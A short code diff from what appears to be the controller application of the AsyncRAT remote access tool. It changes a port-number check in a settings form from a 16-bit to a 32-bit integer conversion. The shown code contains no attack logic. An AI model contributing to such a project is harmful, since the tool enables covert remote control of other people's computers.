@@ -83,7 +83,7 @@ namespace AsyncRAT_Sharp.Forms
         {
             try
             {
-                Convert.ToInt16(textPorts.Text.Trim());
+                Convert.ToInt32(textPorts.Text.Trim());
                 listBox1.Items.Add(textPorts.Text.Trim());
                 textPorts.Clear();
             }
